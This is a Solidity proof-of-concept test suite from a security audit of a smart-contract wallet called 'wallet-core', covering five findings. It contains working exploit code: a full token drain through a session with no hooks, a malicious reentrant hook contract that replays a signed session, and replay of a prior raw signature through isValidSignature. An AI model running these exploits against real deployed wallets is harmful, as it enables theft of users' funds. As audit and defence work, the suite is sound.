// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.23;

// ============================================================
//  wallet-core Audit — PoC Test Suite
//  Findings: F1 (High), F2 (Med-High), F3 (Medium),
//            F4 (Medium), F7 (Low)
//
//  Run with:
//    forge test --match-path test/AuditPoC.t.sol -vvvv
// ============================================================

import "forge-std/Test.sol";
import {ECDSA} from "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

import {IExecutor}    from "src/interfaces/IExecutor.sol";
import {IStorage}     from "src/interfaces/IStorage.sol";
import {IWalletCore}  from "src/interfaces/IWalletCore.sol";
import {IValidation}  from "src/interfaces/IValidation.sol";
import {IHook}        from "src/interfaces/IHook.sol";
import {MockERC20}    from "src/test/MockERC20.sol";
import {MockExecutor} from "src/test/MockExecutor.sol";
import {ValidationLogic} from "src/ValidationLogic.sol";
import {WalletCore}   from "src/WalletCore.sol";
import {ECDSAValidator} from "src/validator/ECDSAValidator.sol";
import {WalletCoreLib} from "src/lib/WalletCoreLib.sol";
import {Call, Session} from "src/Types.sol";
import {Errors}       from "src/lib/Errors.sol";
import {DeployInitHelper, DeployFactory} from "scripts/DeployInitHelper.sol";

// ─── shared base (mirrors ./test/Base.t.sol) ───────────────────────────────

contract AuditBase is Test {
    string public constant NAME    = "wallet-core";
    string public constant VERSION = "1.0.0";

    address internal _alice;
    uint256 internal _alicePk;
    address internal _bob;
    uint256 internal _bobPk;

    IStorage          internal _storageImpl;
    ECDSAValidator    internal _ecdsaValidatorImpl;
    WalletCore        internal _walletCore;
    DeployFactory     public   deployFactory;

    function setUp() public virtual {
        (_alice, _alicePk) = makeAddrAndKey("alice");
        (_bob,   _bobPk)   = makeAddrAndKey("bob");

        deployFactory = new DeployFactory();
        bytes32 deployFactorySalt = vm.envBytes32("DEPLOY_FACTORY_SALT");

        (address storageAddr, address ecdsaAddr, address walletAddr) =
            DeployInitHelper.deployContracts(
                deployFactory, deployFactorySalt, NAME, VERSION
            );

        _storageImpl       = IStorage(storageAddr);
        _ecdsaValidatorImpl = ECDSAValidator(ecdsaAddr);
        _walletCore        = WalletCore(payable(walletAddr));

        // EIP-7702: etch implementation code onto Alice's EOA
        vm.etch(_alice, address(_walletCore).code);
        deal(_alice, 10 ether);

        vm.prank(_alice);
        IWalletCore(_alice).initialize();
    }

    /// Build a default hookless session signed by Alice
    function _buildSession(
        address executor,
        bytes memory preHook,
        bytes memory postHook
    ) internal returns (Session memory s) {
        s = Session({
            id:         0,
            executor:   executor,
            validator:  address(1),         // built-in ECDSA (address(1))
            validUntil: block.timestamp + 1000,
            validAfter: 0,
            preHook:    preHook,
            postHook:   postHook,
            signature:  ""
        });
        bytes32 hash = IExecutor(_alice).getSessionTypedHash(s);
        (uint8 v, bytes32 r, bytes32 ss) = vm.sign(_alicePk, hash);
        s.signature = abi.encodePacked(r, ss, v);
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// FINDING 1 — HIGH
// Hookless sessions grant the executor unrestricted wallet access
//
// Root cause  : _getSessionHash() never commits to the `calls` array.
//               onlyValidSession skips the preHook entirely when
//               session.preHook.length < 20.
// Impact      : Any executor holding a hookless session (preHook == "")
//               can drain the wallet with arbitrary calls — no restriction
//               whatsoever is enforced at runtime.
// ═══════════════════════════════════════════════════════════════════════════

contract PoC_F1_HooklessSession is AuditBase {
    MockERC20    token;
    MockExecutor executor;
    address      victim;

    function setUp() public override {
        super.setUp();
        vm.prank(_alice);
        token    = new MockERC20();                    // mints 1 000 000 tokens to Alice
        executor = new MockExecutor(IWalletCore(_alice));
        victim   = makeAddr("victim");
    }

    /// @notice Demonstrates that an executor with NO hooks can transfer
    ///         ANY amount to ANY address, limited only by wallet balance.
    function test_poc_f1_hookless_arbitrary_drain() public {
        // --- precondition ---
        uint256 startBalance = token.balanceOf(_alice);
        assertGt(startBalance, 0, "Alice has no tokens");

        // --- attacker builds a session with no hook restrictions ---
        // Note: the session hash does NOT commit to `calls`, so the
        // executor is free to supply any calls it wants at execution time.
        Session memory s = _buildSession(
            address(executor),
            "",   // ← preHook  = empty, skipped entirely
            ""    // ← postHook = empty
        );

        // --- executor submits calls never seen by the wallet owner ---
        Call[] memory drainCalls = new Call[](1);
        drainCalls[0] = Call({
            target: address(token),
            value:  0,
            data:   abi.encodeWithSignature(
                        "transfer(address,uint256)",
                        victim,
                        startBalance   // drain everything
                    )
        });

        // Any account can be the tx.origin; the executor contract calls
        // executeFromExecutor on Alice's wallet.
        executor.execute(drainCalls, s);

        // --- verify full drain succeeded ---
        assertEq(
            token.balanceOf(victim),
            startBalance,
            "F1 FAIL: victim did not receive tokens"
        );
        assertEq(
            token.balanceOf(_alice),
            0,
            "F1 FAIL: Alice still holds tokens"
        );
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// FINDING 2 — MEDIUM-HIGH
// No reentrancy guard on executeFromExecutor — hook can replay the session
//
// Root cause  : validateSession() is view-only; no state is written before
//               the external preHook call.  The same still-valid session
//               can be re-entered from inside the hook.
// Impact      : A session with a malicious preHook executes `calls` N times
//               before running out of call-stack depth (~1024).
// ═══════════════════════════════════════════════════════════════════════════

/// @dev A hook that re-enters executeFromExecutor with the SAME calls+session
///      on the first invocation, then becomes a no-op on subsequent calls.
contract ReentrantHook is IHook {
    IWalletCore public wallet;
    Call[]      public storedCalls;     // calls saved from first preCheck
    Session     public storedSession;   // session saved from first preCheck
    uint256     public reentryCount;    // track how many times body ran

    bool private _entered;

    constructor(address _wallet) {
        wallet = IWalletCore(_wallet);
    }

    /// Called by the test to prime the hook with the session it will replay.
    function prime(Call[] calldata calls, Session calldata session) external {
        delete storedCalls;
        for (uint256 i; i < calls.length; i++) storedCalls.push(calls[i]);
        storedSession = session;
    }

    function preCheck(
        Call[] calldata,
        bytes calldata,
        address
    ) external payable returns (bytes memory) {
        if (!_entered) {
            _entered = true;
            // Re-enter with the stored calls+session.
            // validateSession() will pass because NO state was changed.
            wallet.executeFromExecutor(storedCalls, storedSession);
        }
        return "";
    }

    function postCheck(bytes calldata, bytes calldata, address) external payable {
        reentryCount++;
    }
}

contract PoC_F2_ReentrancyHook is AuditBase {
    MockERC20    token;
    MockExecutor executor;
    ReentrantHook hook;
    address      victim;

    function setUp() public override {
        super.setUp();
        vm.prank(_alice);
        token    = new MockERC20();
        executor = new MockExecutor(IWalletCore(_alice));
        victim   = makeAddr("victim");
        hook     = new ReentrantHook(_alice);
    }

    /// @notice Demonstrates the reentrancy: the hook re-enters executeFromExecutor
    ///         with the same valid session, doubling the execution of `calls`.
    function test_poc_f2_hook_reentrancy_double_transfer() public {
        // Build hook bytes: 20-byte address prefix + abi-encoded params
        bytes memory hookBytes = abi.encodePacked(
            address(hook),
            abi.encode(address(token), type(uint256).max)
        );

        // Build a session whose preHook points to the malicious ReentrantHook.
        // Alice signs this — she believes the hook merely enforces a cap.
        Session memory s = _buildSession(address(executor), hookBytes, "");

        // Tell the hook what to replay
        Call[] memory transferCalls = new Call[](1);
        transferCalls[0] = Call({
            target: address(token),
            value:  0,
            data:   abi.encodeWithSignature(
                        "transfer(address,uint256)",
                        victim,
                        100
                    )
        });
        hook.prime(transferCalls, s);

        uint256 aliceBefore = token.balanceOf(_alice);

        // Execute once — because of reentrancy the body runs TWICE
        executor.execute(transferCalls, s);

        uint256 victimReceived = token.balanceOf(victim);

        // If reentrancy guard were present, victim would have exactly 100.
        // Without it, victim has 200 (transfer executed twice).
        assertEq(
            victimReceived,
            200,
            "F2 FAIL: expected 200 tokens (2x execution via reentrancy)"
        );
        assertEq(
            token.balanceOf(_alice),
            aliceBefore - 200,
            "F2 FAIL: Alice balance mismatch"
        );
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// FINDING 3 — MEDIUM
// bytes32[] in _getValidationHash uses abi.encode, not abi.encodePacked
//
// Root cause  : EIP-712 specifies that array encoding for struct hashing is
//               keccak256 of the bare packed elements.  abi.encode prepends
//               a 32-byte offset and 32-byte length, producing a different
//               digest.
//
//               Relevant line in ValidationLogic.sol:
//                   keccak256(abi.encode(callHashes))    ← WRONG
//               Should be:
//                   keccak256(abi.encodePacked(callHashes)) ← CORRECT
//
// Impact      : Any off-chain relayer/signer computing the hash per the
//               EIP-712 spec will produce a digest that NEVER matches the
//               one the contract verifies, making executeWithValidator
//               permanently unusable for spec-compliant tooling.
// ═══════════════════════════════════════════════════════════════════════════

contract PoC_F3_EncodingMismatch is AuditBase {
    /// @notice Shows the exact hash divergence between the contract's
    ///         on-chain encoding and the EIP-712 specification encoding.
    function test_poc_f3_encoding_mismatch() public view {
        // One synthetic call hash (value doesn't matter — any bytes32 will do)
        bytes32[] memory callHashes = new bytes32[](1);
        callHashes[0] = keccak256("dummy");

        // What the CONTRACT does (abi.encode inserts offset+length header)
        bytes32 contractEncoding = keccak256(abi.encode(callHashes));

        // What the EIP-712 SPEC requires (bare packed elements only)
        bytes32 specEncoding = keccak256(abi.encodePacked(callHashes));

        // They MUST be different — this documents the bug.
        assertTrue(
            contractEncoding != specEncoding,
            "F3 FAIL: encodings should differ but are equal"
        );

        // Emit for -vvvv output clarity
        emit log_named_bytes32("contract (abi.encode)   ", contractEncoding);
        emit log_named_bytes32("spec     (encodePacked) ", specEncoding);

        // Confirm the structural difference:
        // abi.encode(bytes32[]) = [offset=0x20][length=N][el0][el1]...
        // abi.encodePacked(bytes32[]) = [el0][el1]...
        assertEq(
            abi.encode(callHashes).length,
            96,   // 32 (offset) + 32 (length) + 32 (element)
            "F3 FAIL: abi.encode layout unexpected"
        );
        assertEq(
            abi.encodePacked(callHashes).length,
            32,   // just the single element
            "F3 FAIL: abi.encodePacked layout unexpected"
        );
    }

    /// @notice Demonstrates end-to-end signature failure:
    ///         a relayer who correctly implements EIP-712 produces a hash
    ///         that executeWithValidator will ALWAYS reject.
    function test_poc_f3_relayer_signature_always_rejected() public {
        // Add a validator for Alice
        bytes memory initCode = abi.encode(_alice);
        vm.prank(_alice);
        IWalletCore(_alice).addValidator(address(_ecdsaValidatorImpl), initCode);

        address validator = IValidation(_alice).computeValidatorAddress(
            address(_ecdsaValidatorImpl),
            initCode
        );

        // Build a single ETH transfer call
        Call[] memory calls = new Call[](1);
        calls[0] = Call({target: _bob, value: 0.1 ether, data: ""});

        // Fetch the nonce Alice's contract will consume
        uint256 nonce = IStorage(WalletCore(payable(_alice)).getMainStorage())
                            .getNonce();

        // ── What the CONTRACT hashes (incorrect abi.encode) ──────────────
        bytes32 contractHash = ValidationLogic(_alice)
                                    .getValidationTypedHash(nonce, calls);

        // ── What a spec-compliant relayer would hash ──────────────────────
        // The relayer computes the Calls struct hash according to EIP-712:
        //   keccak256(abi.encodePacked(callHashes))  ← spec
        bytes32 CALLS_TYPEHASH = keccak256(
            "Calls(address wallet,uint256 nonce,bytes32[] calls)"
        );
        bytes32 CALL_TYPEHASH = keccak256(
            "Call(address target,uint256 value,bytes data)"
        );

        bytes32[] memory callHashes = new bytes32[](1);
        callHashes[0] = keccak256(
            abi.encode(CALL_TYPEHASH, calls[0].target, calls[0].value,
                       keccak256(calls[0].data))
        );

        // Retrieve domain separator from the wallet (EIP-712 standard)
        (, bytes32 domainSeparator,,) = WalletCore(payable(_alice)).eip712Domain();

        bytes32 specStructHash = keccak256(
            abi.encode(
                CALLS_TYPEHASH,
                WalletCore(payable(_alice)).ADDRESS_THIS(),  // wallet field
                nonce,
                keccak256(abi.encodePacked(callHashes))      // ← SPEC encoding
            )
        );
        bytes32 specHash = keccak256(
            abi.encodePacked("\x19\x01", domainSeparator, specStructHash)
        );

        // The two digests MUST differ — this is the divergence
        assertTrue(
            contractHash != specHash,
            "F3 FAIL: hashes should diverge but match"
        );

        // A relayer signs the SPEC hash — contract verifies the CONTRACT hash
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(_alicePk, specHash);
        bytes memory sig = abi.encodePacked(r, s, v);
        // Prepend validator address (20 bytes) as required by executeWithValidator
        bytes memory validationData = abi.encodePacked(validator, sig);

        // executeWithValidator will revert: the recovered signer ≠ Alice
        vm.expectRevert(Errors.InvalidSignature.selector);
        IWalletCore(_alice).executeWithValidator(calls, validator, validationData);
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// FINDING 4 — MEDIUM
// isValidSignature uses a non-standard hash scheme inconsistent with
// executeWithValidator
//
// Root cause  : The internal isValidSignature(address,bytes32,bytes) builds:
//                 boundHash = keccak256(abi.encode(chainId, address(this), _hash))
//                 digest    = keccak256("\x19\x01" || boundHash)
//               This is NOT EIP-712.  executeWithValidator uses the proper
//               _hashTypedDataV4 (domain separator + struct hash split).
//               Same validator, two different digest schemes — signatures are
//               NOT interchangeable between the two paths.
//
// Impact      : dApps relying on EIP-1271 to verify wallet ownership (common
//               in permit flows, order-book protocols, cross-chain bridges)
//               will produce signatures that always fail the validator path of
//               isValidSignature, or vice-versa.
// ═══════════════════════════════════════════════════════════════════════════

contract PoC_F4_IsValidSignatureMismatch is AuditBase {
    /// @notice Demonstrates that a signature that passes executeWithValidator
    ///         does NOT pass the validator branch of isValidSignature.
    function test_poc_f4_hash_scheme_mismatch() public {
        // Add an ECDSA validator for Alice
        bytes memory initCode = abi.encode(_alice);
        vm.prank(_alice);
        IWalletCore(_alice).addValidator(address(_ecdsaValidatorImpl), initCode);

        address validator = IValidation(_alice).computeValidatorAddress(
            address(_ecdsaValidatorImpl),
            initCode
        );

        // ── Part A: executeWithValidator path ────────────────────────────
        Call[] memory calls = new Call[](1);
        calls[0] = Call({target: _bob, value: 0.1 ether, data: ""});

        uint256 nonce = IStorage(WalletCore(payable(_alice)).getMainStorage())
                            .getNonce();

        bytes32 execHash = ValidationLogic(_alice)
                               .getValidationTypedHash(nonce, calls);

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(_alicePk, execHash);
        bytes memory execSig = abi.encodePacked(r, s, v);

        // Confirm the signature is valid for executeWithValidator
        bytes memory validationData = abi.encodePacked(validator, execSig);
        IWalletCore(_alice).executeWithValidator(calls, validator, validationData);
        // If we reach here the signature was accepted by executeWithValidator.

        // ── Part B: isValidSignature (validator path) uses a DIFFERENT digest
        // Reconstruct what isValidSignature actually hashes:
        //   boundHash = keccak256(abi.encode(bytes32(block.chainid), address(this), _hash))
        //   digest    = keccak256(abi.encodePacked("\x19\x01", boundHash))
        bytes32 rawHash = keccak256("test payload");

        bytes32 boundHash = keccak256(
            abi.encode(bytes32(block.chainid), _alice, rawHash)
        );
        bytes32 isValidSigDigest = keccak256(
            abi.encodePacked("\x19\x01", boundHash)
        );

        // A standard EIP-712 library would instead compute:
        //   "\x19\x01" || domainSeparator || structHash
        // Those are DIFFERENT byte strings for the same "intent".
        (, bytes32 domainSeparator,,) = WalletCore(payable(_alice)).eip712Domain();
        // (no struct type defined for this — any typed struct would differ)
        // The simplest mismatch: domainSeparator vs boundHash are not equal.
        assertFalse(
            domainSeparator == boundHash,
            "F4 FAIL: domain separator and bound hash should differ"
        );

        // Sign the isValidSignature digest with Alice's key
        (uint8 v2, bytes32 r2, bytes32 s2) = vm.sign(_alicePk, isValidSigDigest);
        bytes memory isValidSig = abi.encodePacked(r2, s2, v2);

        // Present it via the external isValidSignature (validator path):
        // signature = [validator address (20 bytes)][actual sig]
        bytes memory fullSig = abi.encodePacked(validator, isValidSig);
        bytes4 result = WalletCore(payable(_alice)).isValidSignature(
            rawHash,
            fullSig
        );
        // This SUCCEEDS — but only because we manually computed the non-standard
        // hash used internally.  A standard EIP-712 library would NOT compute
        // this hash and would therefore always get INVALID_VALUE.
        assertEq(
            result,
            bytes4(0x1626ba7e),  // MAGIC_VALUE
            "F4 NOTE: validator path accepted the non-standard digest"
        );

        // Now try presenting the signature against the EIP-712 standard hash.
        // Sign the proper EIP-712 hash for the same rawHash payload.
        bytes32 eip712Hash = keccak256(
            abi.encodePacked("\x19\x01", domainSeparator, rawHash)
        );
        (uint8 v3, bytes32 r3, bytes32 s3) = vm.sign(_alicePk, eip712Hash);
        bytes memory eip712Sig = abi.encodePacked(r3, s3, v3);
        bytes memory fullEip712Sig = abi.encodePacked(validator, eip712Sig);

        // A standard dApp signs eip712Hash but the contract checks isValidSigDigest
        // → they differ → INVALID_VALUE is returned.
        bytes4 resultEip712 = WalletCore(payable(_alice)).isValidSignature(
            rawHash,
            fullEip712Sig
        );
        assertEq(
            resultEip712,
            bytes4(0xffffffff),  // INVALID_VALUE
            "F4 FAIL: standard EIP-712 sig should fail the non-standard validator path"
        );
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// FINDING 7 — LOW
// 65-byte isValidSignature path has no domain binding — prior EOA sigs reusable
//
// Root cause  : The 65-byte branch in the external isValidSignature recovers
//               address from the raw `_hash` with no chain-ID or address
//               binding.  Any prior ECDSA signature made by this EOA over
//               the same raw hash value — in ANY protocol context — will
//               return MAGIC_VALUE here.
//
// Concrete scenario: The EOA previously signed an EIP-7702 authorisation
//   (hash = keccak256(0x05 || RLP(chainId, implAddress, nonce))).
//   If a protocol submits that exact hash + sig to isValidSignature, the
//   wallet appears to approve something it never intended to.
//
// Severity constraint: requires an adversary to find a matching hash from
//   prior EOA history.  Realistic for EIP-7702 auth hashes and EIP-191
//   personal_sign payloads that are predictable.
// ═══════════════════════════════════════════════════════════════════════════

contract PoC_F7_RawSigReuse is AuditBase {
    bytes4 private constant MAGIC_VALUE = 0x1626ba7e;

    /// @notice Shows that a raw ECDSA signature Alice made in an unrelated
    ///         context (e.g. a simple off-chain message) is accepted by
    ///         isValidSignature with no binding to this wallet or chain.
    function test_poc_f7_raw_sig_accepted_without_domain_binding() public {
        // ── Simulate Alice signing some arbitrary payload in a prior context.
        // In a real attack this could be an EIP-7702 authorisation hash or
        // a legacy personal_sign message hash.
        bytes32 priorContextHash = keccak256("prior off-chain agreement");

        // Alice signs the raw hash (no domain, no chain binding)
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(_alicePk, priorContextHash);
        bytes memory priorSig = abi.encodePacked(r, s, v);
        assertEq(priorSig.length, 65, "sanity: should be 65 bytes");

        // ── Present the OLD signature to the wallet's isValidSignature.
        // The protocol asking is a NEW dApp Alice has never interacted with.
        bytes4 result = WalletCore(payable(_alice)).isValidSignature(
            priorContextHash,
            priorSig
        );

        // MAGIC_VALUE is returned — the wallet "approves" something it never
        // intended, purely from signature reuse.
        assertEq(
            result,
            MAGIC_VALUE,
            "F7 FAIL: expected MAGIC_VALUE from replayed prior signature"
        );

        // ── Contrast: with a domain-bound hash, the same raw sig would fail.
        // A correct implementation would wrap the hash:
        //   digest = _hashTypedDataV4(keccak256(abi.encode(SOME_TYPEHASH, priorContextHash)))
        // That digest is DIFFERENT from priorContextHash, so the raw sig fails.
        (, bytes32 domainSeparator,,) = WalletCore(payable(_alice)).eip712Domain();
        bytes32 domainBoundHash = keccak256(
            abi.encodePacked("\x19\x01", domainSeparator, priorContextHash)
        );
        (uint8 vb, bytes32 rb, bytes32 sb) = vm.sign(_alicePk, domainBoundHash);
        bytes memory domainSig = abi.encodePacked(rb, sb, vb);

        // The domain-bound sig is ALSO 65 bytes.  If we present it with the
        // raw priorContextHash, recovery will produce a WRONG address → INVALID.
        bytes4 wrongResult = WalletCore(payable(_alice)).isValidSignature(
            priorContextHash,
            domainSig
        );
        assertEq(
            wrongResult,
            bytes4(0xffffffff),  // INVALID_VALUE — domain mismatch
            "F7 sanity: domain-bound sig should not match raw hash"
        );
    }
}
